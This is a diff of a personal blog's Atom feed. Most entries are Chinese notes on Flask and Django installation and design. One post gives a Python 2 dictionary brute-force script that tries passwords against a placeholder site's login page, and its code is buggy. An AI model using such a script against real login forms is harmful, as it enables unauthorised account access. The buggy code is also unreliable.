@@ -49,6 +49,143 @@
   </entry>
   
   <entry>
+    <title>flask学习（二）</title>
+    <link href="https://aiwanxia.github.io/2017/03/07/flask%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
+    <id>https://aiwanxia.github.io/2017/03/07/flask学习（二）/</id>
+    <published>2017-03-07T02:31:21.000Z</published>
+    <updated>2017-03-07T13:35:01.151Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>Flask 中的线程局部变量¶</strong><br>Flask 的设计抉择之一就是让简单的任务保持简单；它们的实现不应采用大量的代码， 并且不应对你做出限制。为此，我们选择了一些可能让某些人觉得惊讶或异端的设计。例如，Flask 内部使用线程局部的对象，这样你不必在请求内的函数间传递对象来保证线程安全。这个方法很方便，但为了实现依赖注入，或尝试重用含有与请求挂钩的值的代码之时，需要一个有效的请求环境（Request Context）。</p>
+<p><strong>Web 开发危机四伏<br>快乐码 Web，安全记心间。</strong></p>
+<p>你相当可能编写允许用户在你的服务器上注册并留下数据的 Web 应用。即便你是这唯一的用户，也会在应用中留下数据。用户们把数据托付给你，你当然更希望这些数据被妥善安全地保存。</p>
+<p>不幸的是，攻陷 Web 应用的手段五花八门。Flask 可保护你免受一个在现代 Web 应用中最常见的安全问题的困扰：跨站脚本攻击（XSS）。Flask 和底层的 Jinja2 模板引擎已经为你应付得足够好，除非你蓄意把不安全的 HTML 标记为安全。但仍有很多导致安全问题的可能。</p>
+<p>本文档会在 Web 开发中那些需要注意安全的方面警示你。一些安全上的顾虑远比人们想象的复杂，我们所有人都会有低估漏洞被利用的可能性的时候——直到一个精明的攻击者找出利用我们程序的方法。而且，不要侥幸认为你的应用没有重要到足够吸引攻击者。取决于攻击的类型，有时候会是自动化的僵尸机器来检测如何在你数据库中填充垃圾内容、恶意程序链接或之类东西。</p>
+<p>开发者必须在为需求编写代码时留心安全隐患，在这点上，Flask 与其它框架没有区别。</p>
+<p><strong>Python 3 的状态</strong><br>Python 社区目前处于改善库对 Python 新版本支持的进程中。而当前大力改进中的处境仍有一些问题，使得用户难以迁移到 Python 3 。这些问题一部分是因为长时间没有回顾语言中的变化，一部分也是因为我们没有找出低层 API 应该如何做出修改来适应 Python 3 中 Unicode 的变化。</p>
+<p>我们强烈建议在开发时使用 Python 2.6 和 2.7 ，并激活 Python 3 警告。如果你计划在近期升级到 Python 3 ，我们强烈推荐你阅读 如何编写向后兼容的 Python 代码 。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;strong&gt;Flask 中的线程局部变量¶&lt;/strong&gt;&lt;br&gt;Flask 的设计抉择之一就是让简单的任务保持简单；它们的实现不应采用大量的代码， 并且不应对你做出限制。为此，我们选择了一些可能让某些人觉得惊讶或异端的设计。例如，Flask 内部使用线程局部的对象，
+    
+    </summary>
+    
+    
+      <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>flask学习（三--安装）</title>
+    <link href="https://aiwanxia.github.io/2017/03/07/flask%E5%AD%A6%E4%B9%A0(%E5%AE%89%E8%A3%85)/"/>
+    <id>https://aiwanxia.github.io/2017/03/07/flask学习(安装)/</id>
+    <published>2017-03-07T02:31:21.000Z</published>
+    <updated>2017-03-07T13:57:12.962Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>安装</strong><br>Flask 依赖两个外部库：<a href="http://jinja.pocoo.org/" target="_blank" rel="external">Werkzeug</a> 和 <a href="http://werkzeug.pocoo.org/" target="_blank" rel="external">Jinja2</a> 。 Werkzeug 是一个 WSGI（在 Web 应用和多种服务器之间的标准 Python 接口) 工具集。Jinja2 负责渲染模板。</p>
+<p>那么如何在你的电脑上安装这一切？虽说条条大道通罗马，但是最强大的方式是 virtualenv ，所以我们首先来看它。</p>
+<p>你首先需要 Python 2.6 或更高的版本，所以请确认有一个最新的 Python 2.x 安装。 在 Python 3 中使用 Flask 请参考： Python 3 支持 。</p>
+<p>env<br>你很可能想在开发中用上 virtualenv，如果你有生产环境的 shell 权限，你同样会乐于在生产环境中使用它。</p>
+<p><code>virtualenv</code> 解决了什么问题？如果你像我一样喜欢 Python，不仅会在采用 Flask 的Web 应用中用上virtualenv，在别的项目中你也会想用上它。你拥有的项目越多，同时使用不同版本的 Python 工作的可能性也就越大，或者起码需要不同版本的 Python 库。悲惨现实是：常常会有库破坏向后兼容性，然而正经应用不采用外部库的可能微乎其微。当在你的项目中，出现两个或更多依赖性冲突时，你会怎么做？</p>
+<p>virtualenv 拯救世界！virtualenv 为每个不同项目提供一份 Python 安装。它并没有真正安装多个 Python 副本，但是它确实提供了一种巧妙的方式来让各项目环境保持独立。让我们来看看 virtualenv 是怎么工作的。</p>
+<p>如果你在 Mac OS X 或 Linux 下，下面两条命令可能会适用:</p>
+<p>$ <code>sudo easy_install virtualenv</code><br>或更好的:</p>
+<p>$ <code>sudo pip install virtualenv</code><br>上述的命令会在你的系统中安装 virtualenv。它甚至可能会存在于包管理器中， 如果你用的是 <code>Ubuntu</code>，可以尝试:</p>
+<p>$ <code>sudo apt-get install python-virtualenv</code><br>如果你用的是 Windows ，而且没有 easy_install 命令，那么你必须先安装这个命令。查阅 Windows 下的 pip 和 distribute 章节了解如何安装。之后，运行上述的命令，但是要去掉 sudo 前缀。</p>
+<p>virtualenv 安装完毕后，你可以立即打开 shell 然后创建你自己的环境。我通常创建一个项目文件夹，并在其下创建一个 venv 文件夹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ mkdir myproject</div><div class="line">$ cd myproject</div><div class="line">$ virtualenv venv</div><div class="line">New python executable in venv/bin/python</div><div class="line">Installing distribute............done.</div></pre></td></tr></table></figure>
+<p>现在，无论何时你想在某个项目上工作，只需要激活相应的环境。在 OS X 和 Linux 上，执行如下操作:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ . venv/bin/activate</div><div class="line">下面的操作适用 Windows:</div><div class="line"></div><div class="line">$ venv\scripts\activate</div><div class="line">无论通过哪种方式，你现在应该已经激活了 virtualenv（注意你的 shell 提示符显示的是当前活动的环境）。</div></pre></td></tr></table></figure>
+<p>现在你只需要键入以下的命令来激活 virtualenv 中的 Flask:</p>
+<p><code>$ pip install Flask</code></p>
+<p>几秒钟后，一切都搞定了。</p>
+<p>全局安装<br>这样也是可以的，虽然我不推荐。只需要以 root 权限运行 pip:</p>
+<p><code>$ sudo pip install Flask</code><br>（在 Windows 上，在管理员权限的命令提示符中去掉 sudo 运行这条命令 。）</p>
+<p>活在边缘<br>如果你需要最新版本的 Flask，有两种方法：你可以使用 pip 拉取开发版本， 或让它操作一个 git checkout。无论哪种方式，依然推荐使用 virtualenv。</p>
+<p>在一个全新的 virtualenv 中 git checkout 并运行在开发模式下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ git clone http://github.com/mitsuhiko/flask.git</div><div class="line">Initialized empty Git repository in ~/dev/flask/.git/</div><div class="line">$ cd flask</div><div class="line">$ virtualenv venv --distribute</div><div class="line">New python executable in venv/bin/python</div><div class="line">Installing distribute............done.</div><div class="line">$ . venv/bin/activate</div><div class="line">$ python setup.py develop</div><div class="line">...</div><div class="line">Finished processing dependencies for Flask</div><div class="line">这会拉取依赖并激活 git head 作为 virtualenv 中的当前版本。然后你只需要执行 git pull origin 来升级到最新版本。</div></pre></td></tr></table></figure>
+<p>没有 git 时，获取开发版本的替代操作:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ mkdir flask</div><div class="line">$ cd flask</div><div class="line">$ virtualenv venv --distribute</div><div class="line">$ . venv/bin/activate</div><div class="line">New python executable in venv/bin/python</div><div class="line">Installing distribute............done.</div><div class="line">$ pip install Flask==dev</div><div class="line">...</div><div class="line">Finished processing dependencies for Flask==dev</div></pre></td></tr></table></figure>
+<p>Windows 下的 pip 和 distribute<br>在 Windows 下， easy_install</p>
+<p>的安装稍微有点麻烦，但还是相当简单。最简单的方法是下载 <code>distribute_setup.py</code> 文件并运行它。运行这个文件最简单的方法就是打开你的下载文件夹并且双击这个文件。</p>
+<p>下一步，把你的 Python 安装中的 Scripts 文件夹添加到 PATH 环境变量来， 这样 easy_install 命令和其它 Python 脚本就加入到了命令行自动搜索的路径。做法是：右键单击桌面上或是“开始”菜单中的“我的电脑”图标，选择“属性”， 然后单击“高级系统设置”（在 Windows XP 中，单击“高级”选项卡），然后单击 “环境变量”按钮，最后双击“系统变量”栏中的“Path”变量，并加入你的 Python 解释器的 Scripts 文件夹。确保你用分号把它和现有的值分隔开。假设你使用 Python 2.7 且为默认目录，添加下面的值:</p>
+<p><code>@:\Python27\Scripts</code></p>
+<p>如此，你就搞定了！打开命令提示符并执行 easy_install 测试它是否正常工作。如果你开启了 Windows Vista 或 Windows 7 中的用户账户控制，它应该会提示你使用管理员权限。</p>
+<p>现在你有了 <code>easy_install</code> ，你可以用它来安装 <code>pip:</code></p>
+<p><code>easy_install pip</code></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;strong&gt;安装&lt;/strong&gt;&lt;br&gt;Flask 依赖两个外部库：&lt;a href=&quot;http://jinja.pocoo.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Werkzeug&lt;/a&gt; 和 &lt;a href=&quot;http://werk
+    
+    </summary>
+    
+    
+      <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>flask学习（前言）</title>
+    <link href="https://aiwanxia.github.io/2017/03/07/flask%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%89%8D%E8%A8%80%EF%BC%89/"/>
+    <id>https://aiwanxia.github.io/2017/03/07/flask学习（前言）/</id>
+    <published>2017-03-07T02:31:21.000Z</published>
+    <updated>2017-03-07T13:31:56.006Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>前言</strong><br>请在使用 Flask 前阅读。希望本文能回答你一些关于 Flask 的用途和目标以及 Flask 适用情境的问题。</p>
+<p><strong>“微” 是什么意思？</strong><br>“微”(micro) 并不表示你需要把整个 Web 应用塞进单个 Python 文件（虽然确实可以 ），也不意味着 Flask 在功能上有所欠缺。微框架中的“微”意味着 Flask 旨在保持核心简单而易于扩展。Flask 不会替你做出太多决策——比如使用何种数据库。而那些 Flask 所选择的——比如使用何种模板引擎——则很容易替换。除此之外的一切都由可由你掌握。如此，Flask 可以与您珠联璧合。</p>
+<p>默认情况下，Flask 不包含数据库抽象层、表单验证，或是其它任何已有多种库可以胜任的功能。然而，Flask 支持用扩展来给应用添加这些功能，如同是 Flask 本身实现的一样。众多的扩展提供了数据库集成、表单验证、上传处理、各种各样的开放认证技术等功能。Flask 也许是“微小”的，但它已准备好在需求繁杂的生产环境中投入使用。</p>
+<p><strong>配置与惯例</strong><br>Flask 繁多的配置选项在初始状况下都有一个明智的默认值，并会遵循一些惯例。 例如，按照惯例，模板和静态文件分别存储在应用 Python 源代码树下的子目录 templates 和 static 里。虽然这个配置可以修改，但你通常不必这么做， 尤其是在刚开始的时候。</p>
+<p><strong>与 Flask 共成长¶</strong><br>当你配置好并运行 Flask，你会发现社区中有许多可以集成到生产环境项目的扩展。Flask 核心团队会审阅这些扩展，确保经过检验的扩展在未来版本中仍能适用。</p>
+<p>随着你的代码库逐渐壮大，你仍可自由把握项目的设计决策。Flask 会继续尽可能提供的一个非常简单的胶水层，这也是 Python 应该提供的东西。你可以在 SQLAlchemy 或其它数据库工具中实现更高级的模式，酌情引入非关系型数据持久化， 也可以从框架无关的 WSGI——Python 的 Web 接口——工具中获益。</p>
+<p>Flask 里有许多钩子用于定制行为。若是需要深层次的定制，可以直接继承 Flask 类。 如果你对此有兴趣，请阅读 聚沙成塔 章节。如果你好奇 Flask 的设计原则，请查阅 Flask 中的设计决策 章节。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;strong&gt;前言&lt;/strong&gt;&lt;br&gt;请在使用 Flask 前阅读。希望本文能回答你一些关于 Flask 的用途和目标以及 Flask 适用情境的问题。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;“微” 是什么意思？&lt;/strong&gt;&lt;br&gt;“微”(micro) 并不表示你需要
+    
+    </summary>
+    
+    
+      <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>django框架开发学习笔记（一）</title>
+    <link href="https://aiwanxia.github.io/2017/03/07/django/"/>
+    <id>https://aiwanxia.github.io/2017/03/07/django/</id>
+    <published>2017-03-07T02:31:21.000Z</published>
+    <updated>2017-03-07T13:16:19.580Z</updated>
+    
+    <content type="html"><![CDATA[<ol>
+<li>工具需要:<br>win系统64/32位<br>pycharm<br>django</li>
+</ol>
+<p>2.先安装django模块<br><code>pip install django</code><br>安装完成后，打开cmd,输入<code>pip list</code>,若有Django，则安装成功。</p>
+<p>3.打开pycharm,创建一个Django工程，运行<code>manage.py</code>,则你的Django页面就完成了，接着，进行配置Django文件，例：打开<code>settings.py</code>,找到<code>coding type: en-us</code> ,修改为<code>zh-hans</code></p>
+<p>4.定义首页</p>
+<p>在urls.py文件中配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from django.conf.urls import url</div><div class="line">from django.contrib import admin</div><div class="line"></div><div class="line">urlpatterns = [#路由</div><div class="line">    url(r&apos;^admin/&apos;,admin.site.urls),</div><div class="line">    url(r&apos;^$&apos;,)</div><div class="line">    </div><div class="line">]</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;ol&gt;
+&lt;li&gt;工具需要:&lt;br&gt;win系统64/32位&lt;br&gt;pycharm&lt;br&gt;django&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;2.先安装django模块&lt;br&gt;&lt;code&gt;pip install django&lt;/code&gt;&lt;br&gt;安装完成后，打开cmd,输入&lt;code&gt;pip
+    
+    </summary>
+    
+    
+      <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Flask Web开发学习笔记（一）</title>
     <link href="https://aiwanxia.github.io/2017/03/07/Flask%20Web%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
     <id>https://aiwanxia.github.io/2017/03/07/Flask Web开发学习笔记（一）/</id>
@@ -95,64 +232,6 @@
       &lt;p&gt;  &lt;strong&gt;本文章主要整理：&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;0.如何使用虚拟环境&lt;br&gt;1.如何用pip安装Python包（Demo：如何安装flask）&lt;br&gt;2.一个简单的Demo&lt;/p&gt;
 &lt;p&gt;#如何使用虚拟环境&lt;br&gt;&lt;code&gt;pip install f
-    
-    </summary>
-    
-    
-      <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>django框架开发学习笔记（一）</title>
-    <link href="https://aiwanxia.github.io/2017/03/07/django/"/>
-    <id>https://aiwanxia.github.io/2017/03/07/django/</id>
-    <published>2017-03-07T02:31:21.000Z</published>
-    <updated>2017-03-07T13:16:19.580Z</updated>
-    
-    <content type="html"><![CDATA[<ol>
-<li>工具需要:<br>win系统64/32位<br>pycharm<br>django</li>
-</ol>
-<p>2.先安装django模块<br><code>pip install django</code><br>安装完成后，打开cmd,输入<code>pip list</code>,若有Django，则安装成功。</p>
-<p>3.打开pycharm,创建一个Django工程，运行<code>manage.py</code>,则你的Django页面就完成了，接着，进行配置Django文件，例：打开<code>settings.py</code>,找到<code>coding type: en-us</code> ,修改为<code>zh-hans</code></p>
-<p>4.定义首页</p>
-<p>在urls.py文件中配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from django.conf.urls import url</div><div class="line">from django.contrib import admin</div><div class="line"></div><div class="line">urlpatterns = [#路由</div><div class="line">    url(r&apos;^admin/&apos;,admin.site.urls),</div><div class="line">    url(r&apos;^$&apos;,)</div><div class="line">    </div><div class="line">]</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;ol&gt;
-&lt;li&gt;工具需要:&lt;br&gt;win系统64/32位&lt;br&gt;pycharm&lt;br&gt;django&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;2.先安装django模块&lt;br&gt;&lt;code&gt;pip install django&lt;/code&gt;&lt;br&gt;安装完成后，打开cmd,输入&lt;code&gt;pip
-    
-    </summary>
-    
-    
-      <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>flask学习（前言）</title>
-    <link href="https://aiwanxia.github.io/2017/03/07/flask%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%89%8D%E8%A8%80%EF%BC%89/"/>
-    <id>https://aiwanxia.github.io/2017/03/07/flask学习（前言）/</id>
-    <published>2017-03-07T02:31:21.000Z</published>
-    <updated>2017-03-07T13:31:56.006Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>前言</strong><br>请在使用 Flask 前阅读。希望本文能回答你一些关于 Flask 的用途和目标以及 Flask 适用情境的问题。</p>
-<p><strong>“微” 是什么意思？</strong><br>“微”(micro) 并不表示你需要把整个 Web 应用塞进单个 Python 文件（虽然确实可以 ），也不意味着 Flask 在功能上有所欠缺。微框架中的“微”意味着 Flask 旨在保持核心简单而易于扩展。Flask 不会替你做出太多决策——比如使用何种数据库。而那些 Flask 所选择的——比如使用何种模板引擎——则很容易替换。除此之外的一切都由可由你掌握。如此，Flask 可以与您珠联璧合。</p>
-<p>默认情况下，Flask 不包含数据库抽象层、表单验证，或是其它任何已有多种库可以胜任的功能。然而，Flask 支持用扩展来给应用添加这些功能，如同是 Flask 本身实现的一样。众多的扩展提供了数据库集成、表单验证、上传处理、各种各样的开放认证技术等功能。Flask 也许是“微小”的，但它已准备好在需求繁杂的生产环境中投入使用。</p>
-<p><strong>配置与惯例</strong><br>Flask 繁多的配置选项在初始状况下都有一个明智的默认值，并会遵循一些惯例。 例如，按照惯例，模板和静态文件分别存储在应用 Python 源代码树下的子目录 templates 和 static 里。虽然这个配置可以修改，但你通常不必这么做， 尤其是在刚开始的时候。</p>
-<p><strong>与 Flask 共成长¶</strong><br>当你配置好并运行 Flask，你会发现社区中有许多可以集成到生产环境项目的扩展。Flask 核心团队会审阅这些扩展，确保经过检验的扩展在未来版本中仍能适用。</p>
-<p>随着你的代码库逐渐壮大，你仍可自由把握项目的设计决策。Flask 会继续尽可能提供的一个非常简单的胶水层，这也是 Python 应该提供的东西。你可以在 SQLAlchemy 或其它数据库工具中实现更高级的模式，酌情引入非关系型数据持久化， 也可以从框架无关的 WSGI——Python 的 Web 接口——工具中获益。</p>
-<p>Flask 里有许多钩子用于定制行为。若是需要深层次的定制，可以直接继承 Flask 类。 如果你对此有兴趣，请阅读 聚沙成塔 章节。如果你好奇 Flask 的设计原则，请查阅 Flask 中的设计决策 章节。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;strong&gt;前言&lt;/strong&gt;&lt;br&gt;请在使用 Flask 前阅读。希望本文能回答你一些关于 Flask 的用途和目标以及 Flask 适用情境的问题。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;“微” 是什么意思？&lt;/strong&gt;&lt;br&gt;“微”(micro) 并不表示你需要
     
     </summary>
     
@@ -346,6 +425,27 @@ INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.
   </entry>
   
   <entry>
+    <title>利用python进行暴力破解密码</title>
+    <link href="https://aiwanxia.github.io/2017/03/05/%E5%88%A9%E7%94%A8python%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/"/>
+    <id>https://aiwanxia.github.io/2017/03/05/利用python进行暴力破解密码/</id>
+    <published>2017-03-05T03:31:21.000Z</published>
+    <updated>2017-03-06T13:26:23.543Z</updated>
+    
+    <content type="html"><![CDATA[<p>根据字典文件,使用python进行暴力破解,程序很简单<br>注：针对没有验证码的情况<br>实例代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#encoding=utf-8</div><div class="line">import httplib,urllib</div><div class="line">conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)</div><div class="line">f=open(&quot;dict.txt&quot;) </div><div class="line">while 1:</div><div class="line">    pwd=f.readline().strip()</div><div class="line">    if not pwd:</div><div class="line">        print &apos;字典已比对完。&apos; </div><div class="line">        break </div><div class="line">    params = urllib.urlencode(&#123;&apos;username&apos;: &apos;xxx&apos;, &apos;mod&apos;: &apos;&apos;, &apos;password&apos;: pwd&#125;) </div><div class="line">    headers = &#123;&quot;Content-type&quot;:  &quot;application/x-www-form-urlencoded&quot;,&quot;Accept&quot;: &quot;text/plain&quot;&#125; </div><div class="line">    conn.request(&quot;GET&quot;, &quot;/login/aaa.asp&quot;, params, headers) </div><div class="line">    r = conn.getresponse() </div><div class="line">    print r.status, r.reason </div><div class="line">    data1 = r.read().decode(&apos;gbk&apos;)#编码根据实际情况酌情处理  </div><div class="line">    print data1.index(u&apos;您输入的密码有误&apos;),&apos;您输入的密码\&apos;%s\&apos;有误&apos;%pwd </div><div class="line">  conn.close()</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;根据字典文件,使用python进行暴力破解,程序很简单&lt;br&gt;注：针对没有验证码的情况&lt;br&gt;实例代码&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;lin
+    
+    </summary>
+    
+    
+      <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
     <title>初识hexo命令</title>
     <link href="https://aiwanxia.github.io/2017/03/05/%E5%88%9D%E8%AF%86hexo%E5%91%BD%E4%BB%A4/"/>
     <id>https://aiwanxia.github.io/2017/03/05/初识hexo命令/</id>
@@ -371,80 +471,6 @@ INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.
     
     
       <category term="hexo" scheme="https://aiwanxia.github.io/tags/hexo/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>利用python进行暴力破解密码</title>
-    <link href="https://aiwanxia.github.io/2017/03/05/%E5%88%A9%E7%94%A8python%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/"/>
-    <id>https://aiwanxia.github.io/2017/03/05/利用python进行暴力破解密码/</id>
-    <published>2017-03-05T03:31:21.000Z</published>
-    <updated>2017-03-06T13:26:23.543Z</updated>
-    
-    <content type="html"><![CDATA[<p>根据字典文件,使用python进行暴力破解,程序很简单<br>注：针对没有验证码的情况<br>实例代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#encoding=utf-8</div><div class="line">import httplib,urllib</div><div class="line">conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)</div><div class="line">f=open(&quot;dict.txt&quot;) </div><div class="line">while 1:</div><div class="line">    pwd=f.readline().strip()</div><div class="line">    if not pwd:</div><div class="line">        print &apos;字典已比对完。&apos; </div><div class="line">        break </div><div class="line">    params = urllib.urlencode(&#123;&apos;username&apos;: &apos;xxx&apos;, &apos;mod&apos;: &apos;&apos;, &apos;password&apos;: pwd&#125;) </div><div class="line">    headers = &#123;&quot;Content-type&quot;:  &quot;application/x-www-form-urlencoded&quot;,&quot;Accept&quot;: &quot;text/plain&quot;&#125; </div><div class="line">    conn.request(&quot;GET&quot;, &quot;/login/aaa.asp&quot;, params, headers) </div><div class="line">    r = conn.getresponse() </div><div class="line">    print r.status, r.reason </div><div class="line">    data1 = r.read().decode(&apos;gbk&apos;)#编码根据实际情况酌情处理  </div><div class="line">    print data1.index(u&apos;您输入的密码有误&apos;),&apos;您输入的密码\&apos;%s\&apos;有误&apos;%pwd </div><div class="line">  conn.close()</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;根据字典文件,使用python进行暴力破解,程序很简单&lt;br&gt;注：针对没有验证码的情况&lt;br&gt;实例代码&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;lin
-    
-    </summary>
-    
-    
-      <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>never give up</title>
-    <link href="https://aiwanxia.github.io/2017/03/05/never-give-up/"/>
-    <id>https://aiwanxia.github.io/2017/03/05/never-give-up/</id>
-    <published>2017-03-05T02:58:52.000Z</published>
-    <updated>2017-03-06T13:25:36.021Z</updated>
-    
-    <content type="html"><![CDATA[<p>hello,welcome to my personal blog!<br>搭建博客的时候遇见了很多坑，因为网上的教程大多都是hexo 2.X的，现在使用命令<code>npm install -g hexo-cli</code>安装的是最新版本，所以会常常出错，但是，never give up,只要你愿意找，你始终会找到答案的，相信自己可以的，不要放弃，下面我给大家讲讲搭建博客时的一些坑，及如何解决！</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;hello,welcome to my personal blog!&lt;br&gt;搭建博客的时候遇见了很多坑，因为网上的教程大多都是hexo 2.X的，现在使用命令&lt;code&gt;npm install -g hexo-cli&lt;/code&gt;安装的是最新版本，所以会常常出错，但是，ne
-    
-    </summary>
-    
-    
-      <category term="前言" scheme="https://aiwanxia.github.io/tags/%E5%89%8D%E8%A8%80/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>初识python爬虫</title>
-    <link href="https://aiwanxia.github.io/2017/03/05/python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8(%E4%B8%80)/"/>
-    <id>https://aiwanxia.github.io/2017/03/05/python爬虫入门(一)/</id>
-    <published>2017-03-05T02:58:52.000Z</published>
-    <updated>2017-03-06T13:01:41.890Z</updated>
-    
-    <content type="html"><![CDATA[<p>#一.什么是爬虫<br>    <a href="http://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB" target="_blank" rel="external">网络爬虫</a>（又被称为网页蜘蛛，网络机器人，在FOAF社区中间，更经常的称为网页追逐者），是一种按照一定的规则，自动地抓取万维网信息的程序或者脚本。另外一些不常使用的名字还有蚂蚁、自动索引、模拟程序或者蠕虫。</p>
-<p>打开一个网页，里面有网页内容吧，想象一下，有个工具，可以把网页上的内容获取下来，存到你想要的地方，这个工具就是我们今天的主角：爬虫。</p>
-<p>这样是不是更清晰了呢？</p>
-<p>既然了解了爬虫是什么，那么爬虫是如何爬取数据的呢？</p>
-<p>#二.爬虫是哪里爬取数据的<br>    鼠标在页面上点击右键，然后点击view page source。看到这些文字了吗？这才是网页最赤果果的样子。<a href="http://upload-images.jianshu.io/upload_images/3879861-32b85a59ff142691.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=6226699" target="_blank" rel="external">网页</a></p>
-<pre><code>其实所有的网页都是HTML代码，只不过浏览器将这些代码解析成了上面的网页，我们的小爬虫抓取的其实就是HTML代码中的文本啦。
-</code></pre><p>这不合理啊，难不成那些图片也是文本？</p>
-<p>恭喜你，答对了。回到浏览器中有图的哪个tab页，鼠标右键，点击Inspect。会弹出一个面板，点击板左上角的箭头，点击虐狗图片，你会看到下面有红圈圈的地方，是图片的网络地址。图片可以通过该地址保存到本地哦。<br>    你猜的没错，我们的小爬虫抓取的正是网页中的数据，你要知道你想要抓取什么数据，你的目标网站是什么，才可以把想法变成现实的哦。你不能说，我想要这个这个，还有这个，然后数据就自动来了。</p>
-<p>#四、学习爬虫的必备知识</p>
-<p> 1.HTML<br>这个能够帮助你了解网页的结构，内容等。可以参考W3School的教程。</p>
